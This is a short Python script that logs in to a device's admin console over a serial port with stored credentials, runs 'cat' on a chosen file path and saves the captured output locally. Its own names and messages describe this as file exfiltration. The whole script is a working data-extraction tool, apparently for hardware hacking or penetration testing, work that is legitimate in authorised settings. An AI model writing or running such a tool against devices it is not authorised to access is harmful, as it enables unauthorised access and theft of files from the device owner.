import serial
import configparser
import argparse
import os


def openPort(portName):
    baudRate = 115200
    serialConnection = serial.Serial(portName, baudRate, timeout=1)
    return serialConnection


def writeToPort(ser, message):
    message += '\n'
    ser.write(message.encode('utf-8'))


def readBuffer(serialConnection):
    maxConsecutiveEmptyBytes = 5
    currConsecEmptyBytes = 0
    bufferSize = 1024
    allReadBytes = bytearray()
    while True:
        readBytes = serialConnection.read(bufferSize)
        if len(readBytes) == 0:
            currConsecEmptyBytes = currConsecEmptyBytes + 1
        else:
            currConsecEmptyBytes = 0
            allReadBytes += readBytes
        if currConsecEmptyBytes >= maxConsecutiveEmptyBytes:
            break
    return allReadBytes


def flushBuffer(serialConnection):
    readBuffer(serialConnection)


def parseLoginDetails():
    config = configparser.ConfigParser()
    config.read('secret_info.ini')
    login = config['LOGIN_DETAILS']['login']
    password = config['LOGIN_DETAILS']['password']
    return [login, password]


def setupAndParseArgs():
    parser = argparse.ArgumentParser()
    parser.add_argument("port", help="specify the port of the serial com")
    parser.add_argument("file", help="specify absolute filepath to exfil")
    args = parser.parse_args()
    return args


def loginToAdmin(serialConnection, login, password):
    writeToPort(serialConnection, '')
    writeToPort(serialConnection, login)
    writeToPort(serialConnection, password)
    flushBuffer(serialConnection)


def exfilFile(serialConnection, absoluteFilePath: str):
    commandToExfil = 'cat ' + absoluteFilePath
    flushBuffer(serialConnection)
    writeToPort(serialConnection, commandToExfil)
    resultingBytes = cleanExfiledOutput(
        readBuffer(serialConnection), len(commandToExfil))
    fileName = 'exfiled_files' + absoluteFilePath
    os.makedirs(os.path.dirname(fileName), exist_ok=True)
    with open(fileName, 'wb') as writeFile:
        writeFile.write(resultingBytes)
    writeFile.close()


def cleanExfiledOutput(resultingBytes: bytearray, commandLength: int):
    paddingAfterCommand = 2  # "\r\n"
    trailingInputCarrotLength = 3  # " > "
    endOfCommand = commandLength + paddingAfterCommand
    return resultingBytes[endOfCommand:-trailingInputCarrotLength]


if __name__ == "__main__":
    [login, password] = parseLoginDetails()
    args = setupAndParseArgs()
    serialConnection = openPort(args.port)
    print('Flushing buffer before exfiling file...')
    flushBuffer(serialConnection)
    print('Flush complete - Attempting to login...')
    loginToAdmin(serialConnection, login, password)
    print('Login complete - Attempting exfil...')
    exfilFile(serialConnection, args.file)
    print('Exfil complete... file written to exfiled_files' + args.file)
